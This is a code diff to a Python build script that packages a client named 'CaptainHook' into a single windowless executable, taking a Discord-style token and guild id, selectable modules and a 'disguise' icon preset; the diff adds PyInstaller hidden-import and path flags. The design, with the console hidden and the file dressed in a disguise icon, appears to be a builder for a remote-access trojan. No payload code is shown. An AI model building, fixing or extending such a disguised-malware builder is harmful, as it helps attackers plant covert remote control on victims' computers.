@@ -187,12 +187,25 @@ def build(token, guild_id, preset_name, disguise_name):
         progress.add_task(description="Setting up distribution folder...", total=None)
         os.makedirs("dist", exist_ok=True)
         
+        # Prepare hidden imports for PyInstaller
+        # We need to tell PyInstaller about the modules we load dynamically
+        hidden_imports = []
+        for module in preset["modules"]:
+            hidden_imports.append(f"--hidden-import=src.client.modules.{module}")
+        
+        hidden_imports_str = " ".join(hidden_imports)
+        
+        # Add the staging directory to the PYTHONPATH for PyInstaller analysis
+        # This ensures 'src.client' is found correctly during the build
+        staging_root = os.path.abspath("build_staging")
+        
         # OS-Specific instructions
+        # Note: We use --paths to make sure PyInstaller finds our 'src' in build_staging
         if os.name == 'nt':
-            cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} --name CaptainHook build_staging/src/client/main.py"
+            cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ".exe"
         else:
-            cmd = f"pyinstaller --onefile --noconsole --name CaptainHook build_staging/src/client/main.py"
+            cmd = f"pyinstaller --onefile --noconsole --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ""
         
     console.print(Panel(f"""
